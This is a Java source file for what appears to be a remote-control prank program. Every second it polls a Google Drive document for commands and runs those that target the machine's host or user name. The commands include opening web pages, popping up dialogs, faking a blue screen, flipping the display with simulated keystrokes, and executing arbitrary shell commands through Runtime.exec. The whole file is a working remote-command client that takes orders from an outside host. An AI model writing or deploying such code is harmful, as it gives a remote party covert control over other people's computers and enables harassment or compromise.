package com.soup;

import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;

public class Main {

    static String computerName = "";
    static String userName = "";

    static final int OR = 0;
    static final int AND = 1;

    public static void main(String[] args) {

        try {
            computerName = InetAddress.getLocalHost().getHostName();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }

        userName = System.getProperty("user.name");

        System.out.println("User " + userName + " on the computer " + computerName);

        String url = "https://drive.google.com/open?id=1b48tThYAg201MA4BiVuZX5zx92hGxoLLm0kwyYPrY1g";
        String html = "";
        String initContent = "";

        while (true) {
            System.out.println("checking...");
            boolean success = false;
            while(!success) {
                try {
                    html = grabHtml(url);
                    success = true;
                } catch (Exception e) {

                }
            }
            String content = html.substring(html.indexOf("\"og:description\" content=\""));
            content = content.substring(0, content.indexOf(">") - 1);
            content = content.replace("\"og:description\" content=\"", "");

            if (!content.equals(initContent)) {
                initContent = content;
                if (content.endsWith("%%")) { //content must end with %% to run

                    System.out.println(content);

                    String[] conditions, commandStrings;

                    if (content.contains("!c!")) {

                        conditions = content.split("!c!")[0].split("\\|"); //!c! separates conditions from commands
                        commandStrings = content.split("!c!")[1].split("!s!"); //separator for commands is "!s!"
                    } else {
                        conditions = new String[0];
                        commandStrings = content.split("!s!");
                    }

                    //OR or AND
                    boolean meetsConditions = true;
                    String conditionType = conditions[0].trim();
                    int type = OR;
                    if (conditionType.equalsIgnoreCase("t/AND")) {
                        type = AND;
                    }

                    meetsConditions = checkConditions(conditions, type);

                    if (meetsConditions) {
                        ArrayList<Command> commands = new ArrayList<Command>();


                        for (String s : commandStrings) {
                            commands.add(new Command(s.trim()));
                        }

                        runCommands(commands);
                    }
                }
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        /*
        while(true) {
            //String newHtml = grabHtml("https://cmd-mb2.wedeploy.io/index.html");
            String newHtml = grabHtml("https://drive.google.com/open?id=1b48tThYAg201MA4BiVuZX5zx92hGxoLLm0kwyYPrY1g");

            if (!newHtml.equals(initHtml)) {
                System.out.println(newHtml);
                initHtml = newHtml;
                ArrayList<String> paragraphs =
                        new ArrayList<String>(Arrays.asList(StringUtils.substringsBetween(newHtml, "<p>", "</p>")));

                ArrayList<Command> commands = new ArrayList<Command>();

                for (String p : paragraphs) {
                    commands.add(new Command(p));
                }

                System.out.println(paragraphs);
                //runCommands(commands);
            }
            try {
                Thread.sleep(2000);
                return;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        */
    }

    public static boolean checkConditions(String[] conditions, int type) {
        boolean meetsConditions = true;
        if (conditions.length >= 1) {
            if (type == AND) {
                for (String condition : conditions) {
                    condition = condition.trim();
                    if (condition.startsWith("c/")) {
                        if (!computerName.toLowerCase().startsWith(condition.substring(2).toLowerCase())) { //starts with, but ignoring case!
                            meetsConditions = false;
                        }
                    } else if (condition.startsWith("u/")) {
                        if (!userName.equalsIgnoreCase(condition.substring(2))) {
                            meetsConditions = false;
                        }
                    }

                }
            } else if (type == OR) {
                meetsConditions = false;
                for (String condition : conditions) {
                    condition = condition.trim();
                    if (condition.startsWith("c/")) {
                        if (computerName.toLowerCase().startsWith(condition.substring(2).toLowerCase())) { //starts with, but ignoring case!
                            meetsConditions = true;
                        }
                    } else if (condition.startsWith("u/")) {
                        if (userName.equalsIgnoreCase(condition.substring(2))) {
                            meetsConditions = true;
                        }
                    }

                }
            }
        }
        return meetsConditions;
    }

    public static void runCommands(ArrayList<Command> commands) {
        for (Command command : commands) {
            System.out.println("Running: " + command);
            if (command.getCmd().equalsIgnoreCase("nothing")) {
                //don't do anything, lol
                System.out.println("doing nothing, lol");
            } else if (command.getCmd().equalsIgnoreCase("web")) {
                Desktop desktop = java.awt.Desktop.getDesktop();
                for (String sub : command.getSubs()) {
                    try {
                        desktop.browse(URI.create(sub)); } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            } else if (command.getCmd().equalsIgnoreCase("dialog")) {
                if (command.getSubs().size() < 3) {
                    createDialog(command.getSubs().get(0));
                } else {
                    createDialog(command.getSubs().get(0), command.getSubs().get(1), Integer.parseInt(command.getSubs().get(2)));
                }
            } else if (command.getCmd().equalsIgnoreCase("notif")) {
                String header = command.getSubs().get(0);
                String message = command.getSubs().get(1);
                int timeLength = Integer.parseInt(command.getSubs().get(2));
                NotificationThread notif = new NotificationThread(header, message, timeLength);
                notif.start();
            } else if (command.getCmd().equalsIgnoreCase("cd")) {
                //TODO maybe do something with a VBS script
            } else if (command.getCmd().equalsIgnoreCase("BSOD")) {
                switch (command.getSubs().size()) {
                    case 0: new BSOD(); break;
                    case 1: new BSOD(Integer.parseInt(command.getSubs().get(0))); break;
                    case 2: new BSOD(Integer.parseInt(command.getSubs().get(0)), command.getSubs().get(1), 3000); break;
                    case 3: new BSOD(Integer.parseInt(command.getSubs().get(0)), command.getSubs().get(1), Integer.parseInt(command.getSubs().get(2))); break;
                    default: new BSOD();
                }
            } else if (command.getCmd().equalsIgnoreCase("flip")) {
                int preSleep = 2000;
                if (command.getSubs().size() == 1) {
                    preSleep = Integer.parseInt(command.getSubs().get(0));
                }
                new ButtonInputThread(0, 0, new int[]{KeyEvent.CTRL_DOWN_MASK, KeyEvent.ALT_DOWN_MASK, KeyEvent.VK_DOWN}).start();
                new ButtonInputThread(preSleep, 0, new int[]{KeyEvent.CTRL_DOWN_MASK, KeyEvent.ALT_DOWN_MASK, KeyEvent.VK_UP}).start();
            } else if (command.getCmd().equalsIgnoreCase("run")) {
                String runString = "";
                if (command.getSubs().size() > 0) {
                    runString = command.getSubs().get(0);

                }
                System.out.println("Running \"" + runString + "\"");
                Runtime runtime = Runtime.getRuntime();
                try {
                    runtime.exec(runString);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static void createDialog(String text) {
        new dialogThread(text).start();
    }

    public static void createDialog(String text, String title, int iconNo) {
        new dialogThread(text, title, iconNo).start();
    }

    public static String grabHtml(String url) throws Exception {
        StringBuilder builder = new StringBuilder();
        try {
            URL oracle = new URL(url);
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(oracle.openStream()));

            String inputLine;
            while ((inputLine = in.readLine()) != null)
                builder.append(inputLine + "\n");
            in.close();
        } catch (java.io.IOException e) {
            e.printStackTrace();
        }
        return builder.toString();
    }
}

class dialogThread implements Runnable {

    private Thread thread;
    String text, title;
    int iconNo;
    boolean simple;

    public dialogThread(String text) {
        this.text = text;
        simple = true;
    }

    public dialogThread(String text, String title, int iconNo) {
        this.text = text;
        this.title = title;
        this.iconNo = iconNo;
        simple = false;
    }

    @Override
    public void run() {
        if (simple) {
            JOptionPane.showMessageDialog(null, text);
        } else if (!simple) {
            JOptionPane.showMessageDialog(null, text, title, iconNo);
        }
    }

    public void start() {
        System.out.println("Starting " +  this.getClass().getName() + "!");
        if (thread == null) {
            thread = new Thread (this, "TimedEventsHandlerRunnable");
            thread.start();
        }
    }
}


